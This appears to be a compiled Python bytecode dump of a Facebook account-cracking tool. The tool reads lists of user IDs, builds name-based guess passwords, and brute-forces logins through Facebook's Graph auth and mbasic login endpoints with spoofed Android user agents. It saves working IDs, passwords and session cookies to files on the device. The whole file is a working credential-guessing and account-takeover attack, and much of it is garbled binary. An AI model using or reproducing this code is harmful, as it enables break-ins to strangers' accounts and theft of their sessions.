�
    ��_f|V  �                   �H  � d dl Z d dlZd dl mZ d dl mZ  e j        d�  �          ed�  �         	 d dlZn&# e$ r  ed�  �          e j        d�  �         Y nw xY w	 d dlZ	n&# e$ r  ed�  �          e j        d�  �         Y nw xY w	 d dl
Z
n# e$ r  e j        d	�  �         Y nw xY wd d
lmZmZ d dl Z d dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlmZ d dlT d dlm Z  d dlm!Z" d dl mZ d dlm#Z# d dl Z d dlZd dlmZ  ed��  �        j$        Z% ej&        d�  �        j'        �(                    �   �         Z)d Z*d Z+d a,g a-g a.g Z/g Z0g Z1g Z2g a3d Z4g Z5d Z*g Z6d� Z7dZ8dZ9dZ:d� Z;ej<        �=                    d�  �         dZ>dZ?dZ@dZAdZBdddd �ZCe>� d!e@� d"�ZDd#� ZEd$� ZFd%� ZGd&� ZH G d'� d(�  �        ZI eG�   �          dS ))�    N)�system�clearzloading Modules ...zinstalling Requests ...
zpip install requestszinstalling futures ...
zpip install futuresz!pip install mechanize > /dev/null)�Request�urlopen)�ThreadPoolExecutor)�*)�randint)�sleep)�
decompress�   ��max_workersz�https://gist.githubusercontent.com/Nox-Naved/0588acb2b77932048a251d50a973029b/raw/f6de01ac684131b5353854ee114880fb00227cee/Model60c                  ��  � t          t          j        dd�  �        �  �        dz   t          t          j        dd�  �        �  �        z   dz   t          t          j        dd�  �        �  �        z   } t          j        d	d
�  �        }d}dt          j        dd�  �        � dt          j        t          �  �        � dt          j        dd�  �        � dt          j        dd�  �        � d�	|z   }|S )N�d   i�  z.0.0.�   �   �.�(   �   i�pi�d�z�[FBAN/FB4A;FBAV/374.0.0.20.109;FBBV/381462200;FBDM/{density=2.0,width=720,height=1456};FBLC/en_US;FBRV/382083935;FBCR/1010;FBMF/Green;FBBD/Green;FBPN/com.facebook.katana;FBDV/GREEN 2020;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]� Dalvik/2.1.0 (Linux; U; Android �   �   �; � Build/QP1A.�� �?B �o   ��  �) )�str�randomr	   �choice�model2)�vchrome�VAPP�END�uas       �/storage/emulated/0/tai.py�randBuildLSBr)   <   s(  � ��&�.��S�)�)�*�*�7�2�3�v�~�a��7J�7J�3K�3K�K�C�O�PS�TZ�Tb�ce�fi�Tj�Tj�Pk�Pk�k�G��>�)�I�.�.�D� g�C� 
c�F�N�1�R�,@�,@�  
c�  
c�F�M�RX�DY�DY�  
c�  
c�gm�gu�v|�  ~D�  hE�  hE�  
c�  
c�  HN�  HV�  WZ�  [^�  H_�  H_�  
c�  
c�  
c�  dg�  
g�B��I�    z�[FBAN/FB4A;FBAV/86.0.0.13.69;FBBV/33840476;FBDM/{density=2.637,width=1080,height=2147};FBLC/en_US;FBRV/0;FBCR/null;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J700P;FBSV/7.1.1;FBOP/1;FBCA/arm64-v8a:;]z�[FBAN/FB4A;FBAV/96.0.0.17.70;FBBV/40050084;FBDM/{density=2.627,width=1080,height=2147};FBLC/en_US;FBRV/0;FBCR/null;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/vivo 1906;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]c                  ��   � d} dt          j        dd�  �        � dt          j        t          �  �        � dt          j        dd�  �        � d	t          j        d
d�  �        � d�	| z   }|S )Nzy[FBAN/EMA;FBBV/352223683;FBAV/291.0.0.12.110;FBDV/SM-G935FD;FBLC/en_GB;FBNG/WIFI;FBMNT/NOT_METERED;FBDM/{density=1.0125}]r   r   r   r   r   r   r   r   r   r   r   )r!   r	   r"   r#   )r&   r'   s     r(   �randBuildvsskjr,   E   s�   � � F�C� 
c�F�N�1�R�,@�,@�  
c�  
c�F�M�RX�DY�DY�  
c�  
c�gm�gu�v|�  ~D�  hE�  hE�  
c�  
c�  HN�  HV�  WZ�  [^�  H_�  H_�  
c�  
c�  
c�  dg�  
g�B��Ir*   z]2; ALIEN-786z[1;37mz[38;5;208mz
[38;5;46mz
[38;5;48mz[1;33mzadsmanager.facebook.comz("Chromium";v="107", "Not=A?Brand";v="24"�980)�Host�	sec-ch-ua�viewport-widthu�              
       db    88     88 888888 88b 88 
      dPYb   88     88 88__   88Yb88 
     dP__Yb  88  .o 88 88""   88 Y88 
    dP''''Yb 88ood8 88 888888 88  Y8 
[1;31m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
[1;97m[[1;92m~[1;97m] Owner    :   Hamim Farabi
[1;97m[[1;92m~[1;97m] Facebook :   Hamim Farabi
[1;97m[[1;92m~[1;97m] Github   :   ALIEN-786
[1;97m[[1;92m~[1;97m] Version  :   u�   0.1
[1;31m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ c                  �V   � t          j        d�  �         t          t          �  �         d S )Nr   )�osr   �print�logo� r*   r(   r   r   \   s!   � ��I�g����	�$�K�K�K�K�Kr*   c                 �  � t          | �  �        dk    st          |�  �        dk    r�t          d�  �         t          dt          t          t          �  �        �  �        z  �  �         t          dt          t          |�  �        �  �        z  �  �         t          d�  �         t	          d�  �         t          �   �          d S d S )Nr   z9[1;97m[[1;92m~[1;97m] The Process has been Complete...z%[1;97m[[1;92m~[1;97m] TOTAL OK: %sz%[1;97m[[1;92m~[1;97m] TOTAL CP: %s��   [1;31m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━zPress enter to back Main Menu )�lenr3   r    �oks�input�exit)�OKs�cpss     r(   �resultr>   `   s�   � �
�3�x�x�1�}�}��C���A��� 	�R�S�S�S��>��S��X�X���N�O�O�O��>��S��X�X���N�O�O�O��  _�  	`�  	`�  	`��.�/�/�/������� &�r*   c                  ��  � t          j        d�  �         t          t          �  �         t          t          � dt
          � dt          � d��  �         t          t          � dt
          � dt          � d��  �         t          d�  �         t          t          � dt
          � dt          � d	��  �        } | dk    rt          �   �          d S | d
k    rt          d�  �         d S | dk    rt          �   �          d S | dk    rt          �   �          d S | dk    rt          �   �          d S | dk    rt          �   �          d S | dk    rt          �   �          d S | dk    rt          �   �          d S | dk    rt          �   �          d S | dk    rt          j        d�  �         d S | dk    rt          j        d�  �         d S t          d�  �         t          j        d�  �         t#          t$          �  �         d S )Nr   �[�1z] File Crack�0z] Exit Tool r7   �~z] Select Menu : �2z# This is Option Soon available ... �3�4�5�6�7�8�Wz9xdg-open https://chat.whatsapp.com/J3gpK8NYNQBHhEYnVxN4X7�Fz6xdg-open https://facebook.com/groups/3017062245271082/z
 Select valid option ... �   )r2   r   r3   r4   �S�Rr:   �method_crackr;   �random_number�menu�login�	remove_Tc�removef�sids�timer
   �SSB�allkey)�selects    r(   �sarfrazr[   k   s�  � ��I�g����	�$�K�K�K�	�Q�
$�
$��
$�
$�Q�
$�
$�
$�%�%�%�	�Q�
$�
$��
$�
$�Q�
$�
$�
$�%�%�%�	�  [�  \�  \�  \��a�1�1�!�1�1�a�1�1�1�2�2�F���|�|�������	�#����2�3�3�3�3�3�	�#���������	�#����v�v�v�v�v�	�#����w�w�w�w�w�	�#����{�{�{�{�{�	�#����y�y�y�y�y�	�#����v�v�v�v�v�	�#����v�v�v�v�v�	�#���
�	�M�N�N�N���	�#���
�	�J�K�K�K�K�K��+�,�,�,��
�1�����F�����r*   c            	      ��  � t          �   �          t          t          � dt          � dt          � dd� ��  �         t          t          � dt          � dt          � dd� ��  �         t          t          � dt          � dt          � dd� ��  �         t          d	�  �         t	          t          � dt          � d
t          � d��  �        } | dk    rBt
          �                    d�  �         t          �   �         �                    t          �  �         d S | dk    rBt
          �                    d�  �         t          �   �         �                    t          �  �         d S | dk    rBt
          �                    d�  �         t          �   �         �                    t          �  �         d S | dk    rt          �   �          d S t          d�  �         t          j        d�  �         t          �   �          d S )Nr@   rA   z	] Method r   rD   rM   rE   �   r7   rC   z] Select method : �methodA�methodB�methodCrB   z
 Select Valid Option ...)r   r3   rN   rO   r:   �methods�append�
main_crack�crack�idr[   rW   r
   rP   )�options    r(   rP   rP   �   s�  � �	�G�G�G�	�Q�
$�
$��
$�
$�Q�
$�
$��
$�
$�%�%�%�	�Q�
$�
$��
$�
$�Q�
$�
$��
$�
$�%�%�%�	�Q�
$�
$��
$�
$�Q�
$�
$��
$�
$�%�%�%� 
�  [�  \�  \�  \��a�3�3�!�3�3�a�3�3�3�4�4�F���|�|����y�!�!�!������2������	�#������y�!�!�!������2������	�#������y�!�!�!������2������ 
�#����	�	�	�	�	��(�)�)�)�
�j��m�m�m��n�n�n�n�nr*   c                   �8   � e Zd Zd� Zd� Zd� Zd� Zd� Zd� Zd� Z	dS )	rc   c                 �   � g | _         d S )N)re   )�selfs    r(   �__init__zmain_crack.__init__�   s   � �����r*   c           
      ��  � t          �   �          t          t          � dt          � dt          � dt          � d��  �         t          d�  �         t	          t          � dt          � dt          � d��  �        | _        	 t          | j        �  �        �                    �   �         �                    �   �         | _	        | �
                    �   �          d S # t          $ r� t          d�  �         t          j        d�  �         t          j        d	�  �         t          t           �  �         t          d
�  �         t          j        d�  �         t#          �   �         �                    |�  �         Y d S w xY w)Nr@   rC   �]z Example : /sdcard/file.txtr7   z] Enter File Name : zOpps File Not Found ...rM   r   zTry Again ...)r   r3   rN   rO   r:   �file�open�read�
splitlinesre   �pasw�FileNotFoundErrorrW   r
   r2   r   r4   rc   rd   )ri   re   s     r(   rd   zmain_crack.crack�   sH  � �������;�;�Q�;�;��;�;�Q�;�;�;�<�<�<��  _�  	`�  	`�  	`��Q�<�<��<�<�Q�<�<�<�=�=��	�
	#��4�9�o�o�*�*�,�,�7�7�9�9�D�G��I�I�K�K�K�K�K�� � 	#� 	#� 	#��+�,�,�,��J�q�M�M�M��I�g�����$�K�K�K��/�"�"�"��J�q�M�M�M��L�L���r�"�"�"�"�"�"�	#���s   �:AC �BE*�)E*c                 � 
  � 	 t           j        �                    dt          � dt          � dt          � dt
          � t          � dt          � dt          t          �  �        � t          � dt          t          �  �        � dt          � ��  �         t           j        �
                    �   �          |�                    d�  �        d         }	 |�                    d�  �        d	         }n	#  |}Y nxY w|D �]�}|�                    d
|�                    �   �         �  �        �                    d|�  �        �                    d|�                    �   �         �  �        �                    d|�  �        �                    d|�  �        �                    d|�                    �   �         �  �        }t          j        �   �         5 }i dt!          t#          j        �   �         �  �        �dd�dt!          t#          j        �   �         �  �        �dd�dt!          t#          j        �   �         �  �        �dd�dd�dd�d|�d|�dd �d!d"�d#d$�d%t!          t#          j        �   �         �  �        �d&d'�d(d)�d*d+�d,d-d.d/d0��}	d d d �  �         n# 1 swxY w Y   t&          d1d2t!          t)          j        d3d4�  �        �  �        t!          t)          j        d3d4�  �        �  �        d5d6d7d8d9d:d;d<d<d=d>�}
|�                    d?|	|
d@�A�  �        �                    �   �         }dB|v �r@dC�                    dD� |dE         D �   �         �  �        }t3          j        t7          j        dF�  �        �  �        �                    �   �         �                    dGd$�  �        �                    dHdI�  �        �                    dJdK�  �        }dL|� dC|� �}t=          dMt          � dN|� dO|� dt          � ��  �         t          �                    |�  �         tA          dPdQ�  �        �                    |dRz   |z   dSz   �  �         tA          dTdQ�  �        �                    |dRz   |z   dRz   |z   dSz   �  �          ndU|dV         dW         v rmt=          dMt
          � dX|� dO|� dt          � ��  �         t          �                    |�  �         tA          dYdQ�  �        �                    |dRz   |z   dSz   �  �         ��֐��t          d	z  ad S # t          j!        j"        $ r | �#                    |||�  �         Y d S w xY w)ZN� r@   zALIEN-M1�] � �| [1;92mOK:-�/[1;31mr   r   �first�First�last�Last�Name�name�adid�format�json�	device_id�cpl�true�family_device_id�credentials_type�device_based_login_password�error_detail_type�button_with_disabled�source�device_based_login�email�password�access_token�/350685531728%7C62f8ce9f74b12f84c123cc23437a4a32�generate_session_cookiesrA   �meta_inf_fbmeta� �advertiser_id�currently_logged_in_useridrB   �locale�en_GB�client_country_code�GB�
auth.login�authenticate�3com.facebook.account.login.protocol.Fb4aAuthHandler� 882a8490361da98702bf97a021ddc14d��method�fb_api_req_friendly_name�fb_api_caller_class�api_key�!application/x-www-form-urlencoded�graph.facebook.com� N  �@�  �
MOBILE.LTE�False�Unid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62�5120�ViewerReactionsMutation�graphservice�Liger�True� d29d67d37eca387482a8a5b740f84f62�z
User-AgentzContent-Typer.   zX-FB-Net-HNIzX-FB-SIM-HNIzX-FB-Connection-TypezX-Tigon-Is-Retryzx-fb-session-idzx-fb-device-groupzX-FB-Friendly-NamezX-FB-Request-Analytics-TagszX-FB-HTTP-EnginezX-FB-Client-IPzX-FB-Server-Clusterzx-fb-connection-token�'https://b-graph.facebook.com/auth/loginF��data�headers�allow_redirects�session_key�;c              3   �>   K  � | ]}|d          dz   |d         z   V � �dS �r~   �=�valueNr5   ��.0�is     r(   �	<genexpr>z%main_crack.methodA.<locals>.<genexpr>�   �3   � � � �#[�#[��A�f�I�c�M�!�G�*�$<�#[�#[�#[�#[�#[�#[r*   �session_cookies�   r�   �+�_�/�-�sb=�z [ALIEN-OK] � | z/sdcard/ALIEN_OK_ids_M1.txt�a�|�
z/sdcard/SSB_iDs_COOKiEs_M1.txt�www.facebook.com�error�message� [ALIEN-CP] �/sdcard/ALIEN_CP.txt)$�sys�stdout�writerN   rO   �A�loopr8   r9   r=   �flush�split�replace�lower�requests�Sessionr    �uuid�uuid4�uaxr!   r	   �postr�   �join�base64�	b64encoder2   �urandom�decoder3   rb   rn   �
exceptions�ConnectionErrorr^   �ri   �sidr~   �psw�fs�ls�pw�ps�sessionr�   r�   �q�ckkk�ssbb�cookies                  r(   r^   zmain_crack.methodA�   s�  � �?	(��J���z�1�z�z�q�z�z�!�z�z�q�z�$�z�z��z�z�TW�X[�T\�T\�z�^_�z�z�lo�ps�lt�lt�z�z�wx�z�z�{�{�{��J���������C����#�B���Z�Z��_�_�Q�'������������� 3� 3���Z�Z�����
�
�3�3�;�;�G�B�G�G�O�O�PV�WY�W_�W_�Wa�Wa�b�b�j�j�kq�rt�u�u�}�}�  E�  FJ�  K�  K�  S�  S�  TZ�  [_�  [e�  [e�  [g�  [g�  h�  h���%�'�'� /�7�/�F�C��
���$5�$5� /� �&�/� �S�������/� �v�/� �C��
���%�%�	/�
 �1�/� �+�/� 	�
�/� ��/� �B�/� �A�/� �C�/� �2�/� ��T�Z�\�\�"�"�/� �c�/� 	�'�/�  �t�!/�" �*�L�-�)/� /� /�D�/� /� /� /� /� /� /� /� /� /� /���� /� /� /� /�, *-�3���F�N�5�%�0�0�1�1��F�N�5�%�0�0�1�1�$��j��/�-����;�>� >�� �L�L�!J�PT�^e�w|�L�}�}�  C�  C�  E�  E�� �A�%�%��8�8�#[�#[�a�HY�FZ�#[�#[�#[�[�[�D�ci�cs�tv�t~�  @B�  uC�  uC�  dD�  dD�  dK�  dK�  dM�  dM�  dU�  dU�  VY�  Z\�  d]�  d]�  de�  de�  fi�  jm�  dn�  dn�  dv�  dv�  wz�  {~�  d�  d�\`�  I\�  OS�  I\�  I\�  VZ�  I\�  I\�  @F��>�q�>�>�c�>�>�b�>�>�1�>�>�?�?�?��J�J�s�O�O�O��6�s�;�;�A�A�#�c�'�"�*�T�/�R�R�R�SW�Xx�y|�S}�S}�  TD�  TD�  EH�  IL�  EL�  MO�  EO�  PS�  ES�  TZ�  EZ�  [_�  E_�  T`�  T`�  T`��E�'�1�W�:�i�+@�@�@��?��?�?�s�?�?�r�?�?�A�?�?�@�@�@��Z�Z��_�_�_��0��5�5�;�;�C��G�B�J�t�O�L�L�L�L���!�G�D�D�D���"�2� 	(� 	(� 	(��L�L��d�B�'�'�'�'�'�'�	(���sQ   �C S �C �S �C%�#CS �0B5I1�%S �1I5	�5S �8I5	�9IS �+S=�<S=c                 � 
  � 	 t           j        �                    dt          � dt          � dt          � dt
          � t          � dt          t          �  �        � t          � dt          t          �  �        � dt          � ��  �         t           j        �
                    �   �          |�                    d�  �        d         }	 |�                    d�  �        d	         }n	#  |}Y nxY w|D �]�}|�                    d
|�                    �   �         �  �        �                    d|�  �        �                    d|�                    �   �         �  �        �                    d|�  �        �                    d|�  �        �                    d|�                    �   �         �  �        }t          j        �   �         5 }i dt!          t#          j        �   �         �  �        �dd�dt!          t#          j        �   �         �  �        �dd�dt!          t#          j        �   �         �  �        �dd�dd�dd�d|�d|�dd �d!d"�d#d$�d%t!          t#          j        �   �         �  �        �d&d'�d(d)�d*d+�d,d-d.d/d0��}	d d d �  �         n# 1 swxY w Y   t&          d1d2t!          t)          j        d3d4�  �        �  �        t!          t)          j        d3d4�  �        �  �        d5d6d7d8d9d:d;d<d<d=d>�}
|�                    d?|	|
d@�A�  �        �                    �   �         }dB|v �rXdC�                    dD� |dE         D �   �         �  �        }t3          j        t7          j        dF�  �        �  �        �                    �   �         �                    dGd$�  �        �                    dHdI�  �        �                    dJdK�  �        }dL|� dC|� �}t=          dMt          � dNt          � dOt          � dPt          � d|� dQ|� dt          � ��  �         t          �                    |�  �         tA          dRdS�  �        �                    |dTz   |z   dUz   �  �         tA          dVdS�  �        �                    |dTz   |z   dTz   |z   dUz   �  �          ndW|dX         dY         v rmt=          dMt
          � dZ|� dQ|� dt          � ��  �         t          �                    |�  �         tA          d[dS�  �        �                    |dTz   |z   dUz   �  �         �����t          d	z  ad S # t          j!        j"        $ r | �#                    |||�  �         Y d S w xY w)\Nrt   r@   zALIEN-M3ru   z | [1;92mOK:-rx   rv   r   r   ry   rz   r{   r|   r}   r~   r   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   rA   r�   r�   r�   r�   rB   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   Fr�   r�   r�   c              3   �>   K  � | ]}|d          dz   |d         z   V � �dS r�   r5   r�   s     r(   r�   z%main_crack.methodC.<locals>.<genexpr>5  r�   r*   r�   r�   r�   r�   r�   r�   r�   r�   r�   � [�ALIEN-OKrl   r�   z/sdcard/ALIEN_OK_ids_M3.txtr�   r�   r�   �/sdcard/SSB_iDs_COOKiEs_M2.txtr�   r�   r�   r�   r�   )$r�   r�   r�   rN   rO   r�   r�   r8   r9   r=   r�   r�   r�   r�   r�   r�   r    r�   r�   �ua3r!   r	   r�   r�   r�   r�   r�   r2   r�   r�   r3   rb   rn   r�   r�   r`   r�   s                  r(   r`   zmain_crack.methodC  s�  � �?	(��J���w�1�w�w�q�w�w�!�w�w�q�w�$�w�w�QT�UX�QY�QY�w�[\�w�w�il�mp�iq�iq�w�w�tu�w�w�x�x�x��J���������C����#�B���Z�Z��_�_�Q�'������������� 3� 3���Z�Z�����
�
�3�3�;�;�G�B�G�G�O�O�PV�WY�W_�W_�Wa�Wa�b�b�j�j�kq�rt�u�u�}�}�  E�  FJ�  K�  K�  S�  S�  TZ�  [_�  [e�  [e�  [g�  [g�  h�  h���%�'�'� /�7�/�F�C��
���$5�$5� /� �&�/� �S�������/� �v�/� �C��
���%�%�	/�
 �1�/� �+�/� 	�
�/� ��/� �B�/� �A�/� �C�/� �2�/� ��T�Z�\�\�"�"�/� �c�/� 	�'�/�  �t�!/�" �*�L�-�)/� /� /�D�/� /� /� /� /� /� /� /� /� /� /���� /� /� /� /�, *-�3���F�N�5�%�0�0�1�1��F�N�5�%�0�0�1�1�$��j��/�-����;�>� >�� �L�L�!J�PT�^e�w|�L�}�}�  C�  C�  E�  E�� �A�%�%��8�8�#[�#[�a�HY�FZ�#[�#[�#[�[�[�D�ci�cs�tv�t~�  @B�  uC�  uC�  dD�  dD�  dK�  dK�  dM�  dM�  dU�  dU�  VY�  Z\�  d]�  d]�  de�  de�  fi�  jm�  dn�  dn�  dv�  dv�  wz�  {~�  d�  d�\`�  I\�  OS�  I\�  I\�  VZ�  I\�  I\�  @F��G�q�G�G�A�G�G�q�G�G�1�G�G�s�G�G�r�G�G�A�G�G�H�H�H��J�J�s�O�O�O��6�s�;�;�A�A�#�c�'�"�*�T�/�R�R�R�SW�Xx�y|�S}�S}�  TD�  TD�  EH�  IL�  EL�  MO�  EO�  PS�  ES�  TZ�  EZ�  [_�  E_�  T`�  T`�  T`��E�'�1�W�:�i�+@�@�@��>�q�>�>�c�>�>�b�>�>�1�>�>�?�?�?��J�J�s�O�O�O��/��4�4�:�:�3�s�7�2�:�d�?�K�K�K�K���!�G�D�D�D���"�2� 	(� 	(� 	(��L�L��d�B�'�'�'�'�'�'�	(���sQ   �B8S �;C �S �C�CS �(B5I)�S �)I-	�-S �0I-	�1I+S �+T�Tc                 �
  � 	 t           j        �                    dt          � dt          � dt          � dt
          � t          � dt          � dt          t          �  �        � t          � dt          t          �  �        � dt          � ��  �         t           j        �
                    �   �          |�                    d�  �        d         }	 |�                    d�  �        d	         }n	#  |}Y nxY w|D �] }|�                    d
|�                    �   �         �  �        �                    d|�  �        �                    d|�                    �   �         �  �        �                    d|�  �        �                    d|�  �        �                    d|�                    �   �         �  �        }t          j        �   �         5 }i dt!          t#          j        �   �         �  �        �dd�dt!          t#          j        �   �         �  �        �dd�dt!          t#          j        �   �         �  �        �dd�dd�dd�d|�d|�dd �d!d"�d#d$�d%t!          t#          j        �   �         �  �        �d&d'�d(d)�d*d+�d,d-d.d/d0��}	d d d �  �         n# 1 swxY w Y   t&          d1d2t!          t)          j        d3d4�  �        �  �        t!          t)          j        d3d4�  �        �  �        d5d6d7d8d9d:d;d<d<d=d>�}
|�                    d?|	|
d@�A�  �        �                    �   �         }dB|v �r�dC�                    dD� |dE         D �   �         �  �        }t3          j        t7          j        dF�  �        �  �        �                    �   �         �                    dGd$�  �        �                    dHdI�  �        �                    dJdK�  �        }dL|� dC|� �}t=          dMt          � dNt          � dOt          � dPt          � d|� dQ|� dt          � ��  �         t=          dMt          � dNt          � dRt          � dSt          � |� d�
�  �         t          �                    |�  �         tA          dTdU�  �        �                    |dVz   |z   dWz   �  �         tA          dXdU�  �        �                    |dVz   |z   dVz   |z   dWz   �  �          ndY|dZ         d[         v rmt=          dMt
          � d\|� dQ|� dt          � ��  �         t          �                    |�  �         tA          d]dU�  �        �                    |dVz   |z   dWz   �  �         �� ��"t          d	z  ad S # t          j!        j"        $ r | �#                    |||�  �         Y d S w xY w)^Nrt   r@   zALIEN-M2ru   rv   rw   rx   r   r   ry   rz   r{   r|   r}   r~   r   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   rA   r�   r�   r�   r�   rB   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   Fr�   r�   r�   c              3   �>   K  � | ]}|d          dz   |d         z   V � �dS r�   r5   r�   s     r(   r�   z%main_crack.methodB.<locals>.<genexpr>w  r�   r*   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   rl   r�   �COOKIEXXz] : z/sdcard/ALIEN_OK_ids_M2.txtr�   r�   r�   r�   r�   r�   r�   r�   r�   )$r�   r�   r�   rN   rO   r�   r�   r8   r9   r=   r�   r�   r�   r�   r�   r�   r    r�   r�   �ua2r!   r	   r�   r�   r�   r�   r�   r2   r�   r�   r3   rb   rn   r�   r�   r_   r�   s                  r(   r_   zmain_crack.methodBD  s  � �@	(��J���z�1�z�z�q�z�z�!�z�z�q�z�$�z�z��z�z�TW�X[�T\�T\�z�^_�z�z�lo�ps�lt�lt�z�z�wx�z�z�{�{�{��J���������C����#�B���Z�Z��_�_�Q�'������������� 4� 4���Z�Z�����
�
�3�3�;�;�G�B�G�G�O�O�PV�WY�W_�W_�Wa�Wa�b�b�j�j�kq�rt�u�u�}�}�  E�  FJ�  K�  K�  S�  S�  TZ�  [_�  [e�  [e�  [g�  [g�  h�  h���%�'�'� /�7�/�F�C��
���$5�$5� /� �&�/� �S�������/� �v�/� �C��
���%�%�	/�
 �1�/� �+�/� 	�
�/� ��/� �B�/� �A�/� �C�/� �2�/� ��T�Z�\�\�"�"�/� �c�/� 	�'�/�  �t�!/�" �*�L�-�)/� /� /�D�/� /� /� /� /� /� /� /� /� /� /���� /� /� /� /�, *-�3���F�N�5�%�0�0�1�1��F�N�5�%�0�0�1�1�$��j��/�-����;�>� >�� �L�L�!J�PT�^e�w|�L�}�}�  C�  C�  E�  E�� �A�%�%��8�8�#[�#[�a�HY�FZ�#[�#[�#[�[�[�D�ci�cs�tv�t~�  @B�  uC�  uC�  dD�  dD�  dK�  dK�  dM�  dM�  dU�  dU�  VY�  Z\�  d]�  d]�  de�  de�  fi�  jm�  dn�  dn�  dv�  dv�  wz�  {~�  d�  d�\`�  I\�  OS�  I\�  I\�  VZ�  I\�  I\�  @F��G�q�G�G�A�G�G�q�G�G�1�G�G�s�G�G�r�G�G�A�G�G�H�H�H��@�q�@�@�A�@�@�q�@�@�a�@��@�@�@�A�A�A��J�J�s�O�O�O��6�s�;�;�A�A�#�c�'�"�*�T�/�R�R�R�SW�Xx�y|�S}�S}�  TD�  TD�  EH�  IL�  EL�  MO�  EO�  PS�  ES�  TZ�  EZ�  [_�  E_�  T`�  T`�  T`��E�'�1�W�:�i�+@�@�@��>�q�>�>�c�>�>�b�>�>�1�>�>�?�?�?��J�J�s�O�O�O��/��4�4�:�:�3�s�7�2�:�d�?�K�K�K�K���!�G�D�D�D���"�2� 	(� 	(� 	(��L�L��d�B�'�'�'�'�'�'�	(���sQ   �C T �C �T �C%�#CT �0B5I1�%T �1I5	�5T �8I5	�9JT �+U�Uc                 �  � t           j        �                    dt          � dt          � dt          t          �  �        � dt          t          �  �        � dt          � d�                    t          t          t          | j
        �  �        �  �        z  �  �        � t          � ��  �         t           j        �                    �   �          |�                    d�  �        d         }	 |�                    d�  �        d	         }n	#  |}Y nxY w	 |D �]�}|�                    d
|�                    �   �         �  �        �                    d|�  �        �                    d|�                    �   �         �  �        �                    d|�  �        �                    d|�  �        �                    d|�                    �   �         �  �        }t          j        �   �         }t#          j        t&          �  �        }	|�                    d|� d��  �        }
t+          j        dt/          |
j        �  �        �  �        �                    d	�  �        t+          j        dt/          |
j        �  �        �  �        �                    d	�  �        |dd|d�}i |_        |j        �                    i dd�dd�dd�dd�dd �d!d"�d#d$�d%d$�d&|	�d'd(�d)d*�d+d,�d-d�d.d/�d0d1�d2d3��  �         |�                    d4|d5�6�  �        }d7|j        �                    �   �         v rmt?          d8t@          � d9|� d|� dt          � ��  �         t          �!                    |�  �         tE          d:d;�  �        �                    |d<z   |z   d=z   �  �          ned>|j        �                    �   �         v rHt          �!                    |�  �         tE          d?d;�  �        �                    |d<z   |z   d=z   �  �          n���t          d	z  ad S # t          j#        j$        $ r | �%                    |||�  �         Y d S w xY w)@Nrt   z[SSB] z | M4 OK/CP r�   r�   z{:.0%}rv   r   r   ry   rz   r{   r|   r}   r~   z=https://mbasic.facebook.com/login/device-based/password/?uid=z)&flow=login_no_pin&refsrc=deprecated&_rdrzname="lsd" value="(.*?)"zname="jazoest" value="(.*?)"z.https://mbasic.facebook.com/login/save-device/�login_no_pin)�lsd�jazoest�uid�next�flow�passr.   zmbasic.facebook.comr0   r-   r/   zB" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"zsec-ch-ua-mobilez?1zsec-ch-ua-platform�Androidzsec-ch-prefers-color-scheme�light�dntrA   zupgrade-insecure-requestsz
user-agent�acceptz�text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9zsec-fetch-site�nonezsec-fetch-mode�navigatezsec-fetch-userzsec-fetch-dest�documentzaccept-encodingzgzip, deflate, brzaccept-languagez&en-PK,en-GB;q=0.9,en-US;q=0.8,en;q=0.7zHhttps://mbasic.facebook.com/login/device-based/validate-password/?shbl=0F)r�   r�   �c_userr�   z
 [SSB-OK] z/sdcard/SSB_OK.txtr�   r�   r�   �
checkpointz/sdcard/SSB_CP.txt)&r�   r�   r�   rN   r�   r8   r9   r=   r�   �floatre   r�   r�   r�   r�   r�   r�   r!   r"   �sagent�get�re�searchr    �text�groupr�   �updater�   �cookies�get_dictr3   rO   rb   rn   r�   r�   �methodD)ri   r�   r~   r�   r�   r�   r�   r�   r�   �sua�getlog�idpass�completes                r(   r  zmain_crack.methodD�  s�  � ��
���  D�q�  D�  D��  D�  D�#�c�(�(�  D�  D�S��X�X�  D�  D�RS�  D�U]�Ud�Ud�ei�jo�ps�tx�t{�p|�p|�j}�j}�e}�U~�U~�  D�  AB�  D�  D�  	E�  	E�  	E��
�������Z�Z��_�_�Q���	����C����#�B�B��	��B�B�B����	)�� � ���Z�Z�����
�
�3�3�;�;�G�B�G�G�O�O�PV�WY�W_�W_�Wa�Wa�b�b�j�j�kq�rt�u�u�}�}�  E�  FJ�  K�  K�  S�  S�  TZ�  [_�  [e�  [e�  [g�  [g�  h�  h�� �(�*�*���m�F�+�+�� ���  &T�eh�  &T�  &T�  &T�  U�  U��!�y�)C�S���EU�EU�V�V�\�\�]^�_�_�jl�js�  uS�  UX�  Y_�  Yd�  Ue�  Ue�  kf�  kf�  kl�  kl�  mn�  ko�  ko�  vy�  Aq�  yG�  OQ�  S�  S��"$�����&�&�  (
��0E�  (
�GW�Y^�  (
�`k�  nr�  (
�  tF�  HL�  (
�  Nb�  dm�  (
�  oL�  NU�  (
�  W\�  ^a�  (
�  c~�  @C�  (
�  EQ�  SV�  (
�  X`�  bk�  (
�  m}�  E�  (
�  GW�  Yc�  (
